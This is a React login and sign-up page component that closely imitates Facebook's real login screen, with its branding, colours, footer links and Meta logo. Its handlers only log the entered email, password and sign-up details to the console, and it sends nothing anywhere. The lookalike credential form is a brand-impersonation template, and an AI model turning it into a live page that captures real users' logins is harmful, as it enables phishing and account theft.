import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Form, FormControl, FormField, FormItem, FormMessage } from "@/components/ui/form";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import metaLogoImg from "@assets/IMG_7894_1765013426839.png";

const loginSchema = z.object({
  email: z.string().min(1, "Email or phone number is required"),
  password: z.string().min(1, "Password is required"),
});

type LoginForm = z.infer<typeof loginSchema>;

const signupSchema = z.object({
  firstName: z.string().min(1, "What's your name?"),
  lastName: z.string().min(1, "What's your name?"),
  emailOrPhone: z.string().min(1, "You'll use this when you log in and if you ever need to reset your password."),
  newPassword: z.string().min(6, "Enter a combination of at least six numbers, letters and punctuation marks (like ! and &)."),
  birthday: z.object({
    month: z.string(),
    day: z.string(),
    year: z.string(),
  }),
  gender: z.string(),
});

type SignupForm = z.infer<typeof signupSchema>;

const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
const currentYear = new Date().getFullYear();
const years = Array.from({ length: 120 }, (_, i) => String(currentYear - i));

export default function LoginPage() {
  const [signupOpen, setSignupOpen] = useState(false);

  const loginForm = useForm<LoginForm>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const signupForm = useForm<SignupForm>({
    resolver: zodResolver(signupSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      emailOrPhone: "",
      newPassword: "",
      birthday: {
        month: String(new Date().getMonth()),
        day: String(new Date().getDate()),
        year: String(new Date().getFullYear() - 25),
      },
      gender: "female",
    },
  });

  const handleLogin = async (data: LoginForm) => {
    console.log("Login attempt:", data);
  };

  const handleSignup = async (data: SignupForm) => {
    console.log("Signup attempt:", data);
    setSignupOpen(false);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#f0f2f5' }}>
      {/* Language selector */}
      <div className="text-center pt-4 pb-2 px-4">
        <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-xs" style={{ color: '#8a8d91' }}>
          <a href="#" className="hover:underline">English (UK)</a>
          <a href="#" className="hover:underline">മലയാളം</a>
          <a href="#" className="hover:underline">தமிழ்</a>
          <a href="#" className="hover:underline">ಕನ್ನಡ</a>
          <a href="#" className="hover:underline">हिन्दी</a>
          <a href="#" className="hover:underline">বাংলা</a>
          <a href="#" className="hover:underline">తెలుగు</a>
          <a href="#" className="hover:underline">मराठी</a>
          <a href="#" className="hover:underline">Español</a>
          <a href="#" className="hover:underline">Português (Brasil)</a>
          <a href="#" className="hover:underline">Français (France)</a>
          <button className="px-2 py-0.5 border rounded" style={{ borderColor: '#ccd0d5', color: '#65676b' }}>
            <span className="text-lg leading-none">+</span>
          </button>
        </div>
      </div>

      {/* Main content */}
      <main className="flex-1 flex items-center justify-center px-4 py-8 md:py-20">
        <div className="w-full max-w-7xl mx-auto">
          <div className="flex flex-col md:flex-row md:items-center md:gap-16 lg:gap-24">
            {/* Left section - Branding */}
            <div className="flex-1 text-center md:text-left mb-10 md:mb-0 px-4">
              <img
                src="/favicon.png"
                alt="Facebook"
                className="w-20 h-20 md:w-28 md:h-28 mx-auto md:mx-0 mb-3"
              />
              <h1 className="text-2xl md:text-3xl" style={{ color: '#1c1e21' }}>
                Facebook helps you connect and share with the people in your life.
              </h1>
            </div>

            {/* Right section - Login card */}
            <div className="w-full md:w-auto md:flex-shrink-0">
              <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 w-full md:w-[396px]">
                <Form {...loginForm}>
                  <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-4">
                    <FormField
                      control={loginForm.control}
                      name="email"
                      render={({ field }) => (
                        <FormItem>
                          <FormControl>
                            <input
                              {...field}
                              type="text"
                              placeholder="Email address or phone number"
                              className="w-full px-4 py-3.5 text-base border rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
                              style={{ backgroundColor: '#fff', borderColor: '#dddfe2', color: '#1c1e21' }}
                            />
                          </FormControl>
                          <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                        </FormItem>
                      )}
                    />

                    <FormField
                      control={loginForm.control}
                      name="password"
                      render={({ field }) => (
                        <FormItem>
                          <FormControl>
                            <input
                              {...field}
                              type="password"
                              placeholder="Password"
                              className="w-full px-4 py-3.5 text-base border rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
                              style={{ backgroundColor: '#fff', borderColor: '#dddfe2', color: '#1c1e21' }}
                            />
                          </FormControl>
                          <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                        </FormItem>
                      )}
                    />

                    <button
                      type="submit"
                      className="w-full py-3 text-white text-xl font-bold rounded-md hover:opacity-90 transition"
                      style={{ backgroundColor: '#1877f2' }}
                    >
                      Log in
                    </button>
                  </form>
                </Form>

                <div className="text-center mt-4">
                  <a
                    href="#"
                    className="text-sm hover:underline inline-block"
                    style={{ color: '#1877f2' }}
                  >
                    Forgotten password?
                  </a>
                </div>

                <div className="my-5 border-t" style={{ borderColor: '#dadde1' }} />

                <div className="text-center">
                  <button
                    onClick={() => setSignupOpen(true)}
                    className="px-4 py-3 text-white text-base font-semibold rounded-md hover:opacity-90 transition inline-block"
                    style={{ backgroundColor: '#42b72a' }}
                  >
                    Create new account
                  </button>
                </div>
              </div>

              <p className="text-center text-sm mt-7 px-4" style={{ color: '#1c1e21' }}>
                <a href="#" className="font-semibold hover:underline">Create a Page</a>
                <span style={{ color: '#65676b' }}> for a celebrity, brand or business.</span>
              </p>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-auto py-6 px-4" style={{ backgroundColor: '#ffffff' }}>
        <div className="max-w-7xl mx-auto">
          <div className="mb-2">
            <img src={metaLogoImg} alt="Meta" className="h-5 opacity-60" />
          </div>

          <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs mb-2" style={{ color: '#8a8d91' }}>
            <a href="#" className="hover:underline">English (UK)</a>
            <a href="#" className="hover:underline">മലയാളം</a>
            <a href="#" className="hover:underline">தமிழ்</a>
            <a href="#" className="hover:underline">ಕನ್ನಡ</a>
            <a href="#" className="hover:underline">हिन्दी</a>
            <a href="#" className="hover:underline">বাংলা</a>
            <a href="#" className="hover:underline">తెలుగు</a>
            <a href="#" className="hover:underline">मराठी</a>
            <a href="#" className="hover:underline">Español</a>
            <a href="#" className="hover:underline">Português (Brasil)</a>
            <a href="#" className="hover:underline">Français (France)</a>
            <button className="px-1.5 py-0.5 border rounded text-xs" style={{ borderColor: '#ccd0d5', color: '#65676b' }}>
              <span className="text-sm leading-none">+</span>
            </button>
          </div>

          <div className="border-t pt-2" style={{ borderColor: '#dadde1' }}>
            <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs mb-2" style={{ color: '#8a8d91' }}>
              <a href="#" className="hover:underline">Sign Up</a>
              <a href="#" className="hover:underline">Log In</a>
              <a href="#" className="hover:underline">Messenger</a>
              <a href="#" className="hover:underline">Facebook Lite</a>
              <a href="#" className="hover:underline">Video</a>
              <a href="#" className="hover:underline">Places</a>
              <a href="#" className="hover:underline">Games</a>
              <a href="#" className="hover:underline">Marketplace</a>
              <a href="#" className="hover:underline">Meta Pay</a>
              <a href="#" className="hover:underline">Meta Store</a>
              <a href="#" className="hover:underline">Meta Quest</a>
            </div>

            <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs mb-2" style={{ color: '#8a8d91' }}>
              <a href="#" className="hover:underline">Instagram</a>
              <a href="#" className="hover:underline">Threads</a>
              <a href="#" className="hover:underline">Fundraisers</a>
              <a href="#" className="hover:underline">Services</a>
              <a href="#" className="hover:underline">Voting Information Centre</a>
              <a href="#" className="hover:underline">Privacy Policy</a>
              <a href="#" className="hover:underline">Privacy Centre</a>
              <a href="#" className="hover:underline">Groups</a>
              <a href="#" className="hover:underline">About</a>
              <a href="#" className="hover:underline">Create ad</a>
              <a href="#" className="hover:underline">Create Page</a>
            </div>

            <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs" style={{ color: '#8a8d91' }}>
              <a href="#" className="hover:underline">Developers</a>
              <a href="#" className="hover:underline">Careers</a>
              <a href="#" className="hover:underline">Cookies</a>
              <a href="#" className="hover:underline">AdChoices</a>
              <a href="#" className="hover:underline">Terms</a>
              <a href="#" className="hover:underline">Help</a>
              <a href="#" className="hover:underline">Contact uploading and non-users</a>
            </div>

            <div className="mt-4 text-xs" style={{ color: '#8a8d91' }}>
              Meta © 2025
            </div>
          </div>
        </div>
      </footer>

      {/* Signup Dialog */}
      <Dialog open={signupOpen} onOpenChange={setSignupOpen}>
        <DialogContent className="sm:max-w-[432px] p-0 gap-0 bg-white rounded-lg overflow-hidden border-0">
          <DialogHeader className="p-4 pb-0">
            <DialogTitle className="text-3xl font-bold" style={{ color: '#1c1e21' }}>
              Sign Up
            </DialogTitle>
            <DialogDescription className="text-sm mt-1" style={{ color: '#65676b' }}>
              It's quick and easy.
            </DialogDescription>
          </DialogHeader>

          <div className="my-3 border-t" style={{ borderColor: '#dadde1' }} />

          <Form {...signupForm}>
            <form onSubmit={signupForm.handleSubmit(handleSignup)} className="px-4 pb-6 space-y-3">
              <div className="flex gap-3">
                <FormField
                  control={signupForm.control}
                  name="firstName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input
                          {...field}
                          placeholder="First name"
                          className="w-full px-3 py-2.5 text-base border rounded-md"
                          style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }}
                        />
                      </FormControl>
                      <FormMessage className="text-xs" style={{ color: '#be4b49' }} />
                    </FormItem>
                  )}
                />
                <FormField
                  control={signupForm.control}
                  name="lastName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input
                          {...field}
                          placeholder="Surname"
                          className="w-full px-3 py-2.5 text-base border rounded-md"
                          style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }}
                        />
                      </FormControl>
                      <FormMessage className="text-xs" style={{ color: '#be4b49' }} />
                    </FormItem>
                  )}
                />
              </div>

              <FormField
                control={signupForm.control}
                name="emailOrPhone"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input
                        {...field}
                        placeholder="Mobile number or email address"
                        className="w-full px-3 py-2.5 text-base border rounded-md"
                        style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }}
                      />
                    </FormControl>
                    <FormMessage className="text-xs" style={{ color: '#be4b49' }} />
                  </FormItem>
                )}
              />

              <FormField
                control={signupForm.control}
                name="newPassword"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input
                        {...field}
                        type="password"
                        placeholder="New password"
                        className="w-full px-3 py-2.5 text-base border rounded-md"
                        style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }}
                      />
                    </FormControl>
                    <FormMessage className="text-xs" style={{ color: '#be4b49' }} />
                  </FormItem>
                )}
              />

              <div>
                <label className="text-xs font-semibold mb-1 block" style={{ color: '#606770' }}>
                  Date of birth
                </label>
                <div className="flex gap-3">
                  <select
                    className="flex-1 px-3 py-2.5 text-base border rounded-md appearance-none cursor-pointer"
                    style={{ backgroundColor: '#fff', borderColor: '#ccd0d5', color: '#1c1e21' }}
                    value={signupForm.watch("birthday.day")}
                    onChange={(e) => signupForm.setValue("birthday.day", e.target.value)}
                  >
                    {days.map((d) => <option key={d} value={d}>{d}</option>)}
                  </select>
                  <select
                    className="flex-1 px-3 py-2.5 text-base border rounded-md appearance-none cursor-pointer"
                    style={{ backgroundColor: '#fff', borderColor: '#ccd0d5', color: '#1c1e21' }}
                    value={signupForm.watch("birthday.month")}
                    onChange={(e) => signupForm.setValue("birthday.month", e.target.value)}
                  >
                    {months.map((m, idx) => <option key={idx} value={String(idx)}>{m}</option>)}
                  </select>
                  <select
                    className="flex-1 px-3 py-2.5 text-base border rounded-md appearance-none cursor-pointer"
                    style={{ backgroundColor: '#fff', borderColor: '#ccd0d5', color: '#1c1e21' }}
                    value={signupForm.watch("birthday.year")}
                    onChange={(e) => signupForm.setValue("birthday.year", e.target.value)}
                  >
                    {years.map((y) => <option key={y} value={y}>{y}</option>)}
                  </select>
                </div>
              </div>

              <div>
                <label className="text-xs font-semibold mb-1 block" style={{ color: '#606770' }}>
                  Gender
                </label>
                <div className="flex gap-3">
                  {[
                    { value: "female", label: "Female" },
                    { value: "male", label: "Male" },
                    { value: "custom", label: "Custom" }
                  ].map((option) => (
                    <label
                      key={option.value}
                      className="flex-1 flex items-center justify-between px-3 py-2.5 border rounded-md cursor-pointer"
                      style={{ backgroundColor: '#fff', borderColor: '#ccd0d5' }}
                    >
                      <span className="text-base" style={{ color: '#1c1e21' }}>{option.label}</span>
                      <input
                        type="radio"
                        name="gender"
                        value={option.value}
                        onChange={(e) => signupForm.setValue("gender", e.target.value)}
                        checked={signupForm.watch("gender") === option.value}
                        className="w-4 h-4 cursor-pointer"
                      />
                    </label>
                  ))}
                </div>
              </div>

              <p className="text-xs leading-relaxed" style={{ color: '#777' }}>
                People who use our service may have uploaded your contact information to Facebook.{" "}
                <a href="#" className="hover:underline" style={{ color: '#385898' }}>Learn more</a>.
              </p>

              <p className="text-xs leading-relaxed" style={{ color: '#777' }}>
                By clicking Sign Up, you agree to our{" "}
                <a href="#" className="hover:underline" style={{ color: '#385898' }}>Terms</a>,{" "}
                <a href="#" className="hover:underline" style={{ color: '#385898' }}>Privacy Policy</a> and{" "}
                <a href="#" className="hover:underline" style={{ color: '#385898' }}>Cookies Policy</a>.
                You may receive SMS notifications from us and can opt out at any time.
              </p>

              <div className="text-center pt-2">
                <button
                  type="submit"
                  className="px-16 py-2 text-white text-lg font-bold rounded-md hover:opacity-90 transition"
                  style={{ backgroundColor: '#00a400' }}
                >
                  Sign Up
                </button>
              </div>
            </form>
          </Form>
        </DialogContent>
      </Dialog>
    </div>
  );
}